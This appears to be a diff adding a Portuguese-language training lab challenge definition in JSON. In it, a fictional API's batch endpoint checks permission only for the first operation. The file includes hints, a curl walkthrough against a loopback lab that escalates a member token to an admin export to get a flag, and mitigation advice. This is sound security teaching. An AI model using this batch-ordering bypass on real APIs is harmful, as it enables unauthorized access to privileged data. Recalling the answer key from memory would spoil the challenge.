@@ -1,0 +1,83 @@
+{
+  "slug": "api-batch-endpoint-auth",
+  "title": "Uma verificação, muitas operações",
+  "codename": "NORTHBEAM API",
+  "summary": "O endpoint de batch da Northbeam autoriza um request apenas pela primeira operação. Um membro pode colocar `invoices.list` primeiro e `admin.export` depois no mesmo batch e receber a exportação financeira, incluindo a flag do vault.",
+  "category": "api",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "api-batch-endpoint-auth",
+  "estimated_minutes": 18,
+  "xp": 210,
+  "tech": [
+    "Flask",
+    "JSON API",
+    "Authorization",
+    "Batching"
+  ],
+  "tags": [
+    "api",
+    "broken-function-level-authorization",
+    "batch",
+    "idor-like",
+    "privilege-escalation"
+  ],
+  "story": "A Northbeam reduziu a latência do dashboard permitindo que os clientes agrupassem operações em um único request `POST /api/batch`. O gateway verifica a permissão do chamador para a operação que lê primeiro e depois executa o restante em ordem, porque chegaram em um batch já autorizado. O exporter em si não verifica nada; ele confia no gateway. Resultados parciais são retornados com status codes por operação para que os clientes possam repetir falhas.",
+  "objective": "Com um token de membro, envie um batch cuja primeira operação é permitida e cuja segunda operação é `admin.export`, e extraia a flag do vault do resultado da exportação.",
+  "rules": "Permaneça na origem loopback atribuída. O token endpoint e a documentação da API fazem parte do lab; nenhum host externo é contatado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag da exportação financeira",
+      "flag_type": "api",
+      "points": 210,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia o contrato do batch",
+      "body": "`GET /docs` mostra as permissões por operação e diz que o gateway verifica o batch pela primeira operação. Chame `POST /api/batch` com `{\"operations\": [{\"op\": \"admin.export\"}]}` e compare com um `GET /api/admin/export` de operação única.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "As operações não são independentes",
+      "body": "A autorização do batch acontece uma única vez, antes do loop. As operações seguintes herdam a decisão tomada para `operations[0]`, então o handler de exportação roda para qualquer batch cuja primeira operação o membro tenha permissão de executar.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "A ordem importa",
+      "body": "Obtenha um token em `POST /api/token` e faça `POST /api/batch` com `{\"operations\": [{\"op\": \"invoices.list\"}, {\"op\": \"admin.export\"}]}`. O segundo resultado carrega `data.vault_flag`. Inserir uma leitura com falha no meio retorna `207` e ainda inclui a exportação.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Passo 1 — obtenha um token de membro.**\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/api/token \\\n  -H 'Content-Type: application/json' -d '{\"name\":\"demo\"}'\n# {\"token\": \"nb_...\", \"role\": \"member\", \"permissions\": [\"accounts:read\", ...]}\n```\n\n**Passo 2 — confirme que uma chamada privilegiada direta é negada.**\n\n```bash\ncurl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:PORT/api/admin/export \\\n  -H 'Authorization: Bearer nb_...'\n# 403\ncurl -s -X POST http://127.0.0.1:PORT/api/batch -H 'Authorization: Bearer nb_...' \\\n  -H 'Content-Type: application/json' -d '{\"operations\":[{\"op\":\"admin.export\"}]}'\n# {\"error\": \"permission denied\", \"required\": \"admin:export\", ...}   403\n```\n\n**Passo 3 — coloque uma operação permitida primeiro.**\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/api/batch \\\n  -H 'Authorization: Bearer nb_...' -H 'Content-Type: application/json' \\\n  -d '{\"operations\":[{\"op\":\"invoices.list\"},{\"op\":\"admin.export\"}]}'\n# 200\n# {\"results\": [\n#   {\"op\": \"invoices.list\", \"status\": 200, \"data\": [...]},\n#   {\"op\": \"admin.export\", \"status\": 200, \"data\": {\"export\": \"northbeam-finance\", \"role\": \"member\", \"vault_flag\": \"RV{...}\"}}\n# ], \"partial\": false, \"count\": 2}\n```\n\n**Passo 4 — resultados parciais ainda vazam.** Um batch de três operações com uma leitura que falha retorna `207` e inclui a exportação:\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/api/batch \\\n  -H 'Authorization: Bearer nb_...' -H 'Content-Type: application/json' \\\n  -d '{\"operations\":[{\"op\":\"reports.summary\"},{\"op\":\"invoices.get\",\"value\":{\"id\":\"inv-404\"}},{\"op\":\"admin.export\"}]}'\n# 207, results: 200 / 404 / 200 (with vault_flag)\n```",
+    "root_cause": "O endpoint de batch realiza a autorização em nível de função uma única vez, usando `operations[0]`, e então despacha cada elemento sem revalidar a permissão exigida por operação. O handler de exportação também assume que o gateway já o autorizou. Resultados mistos são retornados como sucessos parciais, o que esconde a travessia da fronteira de privilégios entre status codes ordinários por operação.",
+    "mitigation": "Autorize cada operação individualmente antes de executar qualquer coisa (falhe o batch inteiro na primeira negação), ou autorize cada operação conforme ela roda e nunca compartilhe uma decisão entre elementos. Negue tipos de operação desconhecidos. Mantenha a autorização própria do handler downstream como defesa em profundidade, retorne um único 403 para o batch em caso de negação e registre em log o mapeamento operação-permissão para que resultados parciais não possam mascarar uma chamada negada."
+  },
+  "references": [
+    {
+      "title": "OWASP API Security 2023 — A5: Broken Function Level Authorization",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
+      "source_type": "standard",
+      "description": "Falhas de autorização em nível de função, incluindo endpoints que verificam uma ação e executam outra."
+    },
+    {
+      "title": "OWASP — Authorization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Requisitos de autorização por recurso e por ação."
+    },
+    {
+      "title": "PortSwigger — Broken access control",
+      "url": "https://portswigger.net/web-security/access-control",
+      "source_type": "official",
+      "description": "Escalação de privilégios e aplicação inconsistente entre caminhos de request."
+    }
+  ]
+}
